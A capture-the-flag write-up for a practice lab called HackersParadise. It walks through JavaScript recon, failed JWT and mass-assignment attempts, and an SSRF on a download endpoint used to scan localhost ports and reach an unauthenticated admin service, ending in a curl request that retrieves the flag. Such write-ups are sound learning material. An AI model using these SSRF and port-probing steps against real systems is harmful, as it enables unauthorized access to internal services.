# Bug Forge Weekly CTF — HackersParadise

**Flag:** `bug{35vuD9bkwcrRZGqYRSKUAQTZh93YZSwC}`

**Vulnerability:** SSRF on `POST /api/limewire/download` enabling internal port discovery and unauthenticated access to an admin service.

## Recon

Hint said *Read the JS files*. The landing page loaded `/js/app.js` and `/js/shop.js`. Pulled the rest by enumerating linked pages (`login.html`, `limewire.html`, `guestbook.html`, `profile.html`, `redpillconsole.html`, `register.html`) and grepping for `<script src=...>`:

```
/js/app.js  /js/shop.js  /js/auth.js  /js/guestbook.js
/js/limewire.js  /js/profile.js  /js/redpillconsole.js  /js/register.js
```

Mapped the API surface from those files:

- `POST /api/auth/register`, `POST /api/auth/login`, `GET /api/auth/me`, `POST /api/auth/change-password`
- `GET /api/products`
- `POST /api/orders`
- `GET /api/guestbook`, `POST /api/guestbook`
- `GET /api/limewire/files`, `POST /api/limewire/download`
- `GET /api/redpillconsole/{stats,users,orders,guestbook}` — gated by `role === 'redpill'`

Two roles exist: `bluepill` (default) and `redpill` (admin). Goal: read something only the redpill role can.

## Dead ends

**Mass-assignment on register.** Sending `"role":"redpill"` in `/api/auth/register` was ignored — server forced `bluepill`.

**JWT tampering.**
- `alg=none` rejected.
- HS256 secret crack with hashcat (`-m 16500`) against rockyou — exhausted, no hit.

**Direct redpill endpoint hits.** `/api/redpillconsole/*` correctly checked the JWT role.

## The crack — SSRF

`limewire.js` posts `{"torrent_url": "..."}` to `/api/limewire/download`. The server clearly proxies that URL. Trying the original URL worked; switching to the bare host revealed an SSRF service listing:

```
POST /api/limewire/download {"torrent_url":"http://localhost:4000/"}
→ {"status":"online","endpoints":["/torrent","/redpillconsole","/rabbithole"]}
```

So the backend has an internal "torrent service" on `:4000` with several mounted endpoints. There's a path-allowlist (`http://localhost/` returns *Invalid service URL*), but `localhost:4000/...` and arbitrary subpaths under it pass through.

Walking the listed endpoints surfaced hints but no flag:
- `/redpillconsole` returned an admin-only 403 — the same auth check, just over SSRF.
- `/redpillconsole/users/1/password` taunted with `"Really? Password for 1?"` regardless of id or query string.
- `/rabbithole` said *"How deep does the rabbit hole go?"* but every nested path 404'd.

## The actual move — port scan via SSRF

The allowlist appears to gate by **host:port**, not by path. Tried other localhost ports through the same SSRF:

```
http://localhost:3000/  → Invalid service URL
http://localhost:5000/  → Invalid service URL
http://localhost:4001/  → {"status":"online","clearence-level":"admin"}
```

A second admin service on `:4001` was reachable. Bruted common admin paths:

```
/admin           → online, admin clearance
/admin/flag      → Could not reach
/admin/flag.txt  → {"flag":"bug{35vuD9bkwcrRZGqYRSKUAQTZh93YZSwC}"}
/admin/flags     → "You're so close"
```

## Final exploit

```bash
TOKEN=<any valid bluepill JWT from /api/auth/register>

curl -s -X POST "https://<host>/api/limewire/download" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"torrent_url":"http://localhost:4001/admin/flag.txt"}'
```

→ `bug{35vuD9bkwcrRZGqYRSKUAQTZh93YZSwC}`

## Takeaways

- The role check on `/api/redpillconsole/*` is enforced at the public edge, but the **same internal service** is mounted under the SSRF-reachable backend with no auth.
- The SSRF allowlist is host:port based — and an extra port on the same host was forgotten.
- The `localhost:4001` service had no path-listing endpoint, so the flag is only findable by guessing `/admin/flag.txt`. A wordlist sweep would catch it; manually I tried about a dozen variants before landing on `flag.txt`.
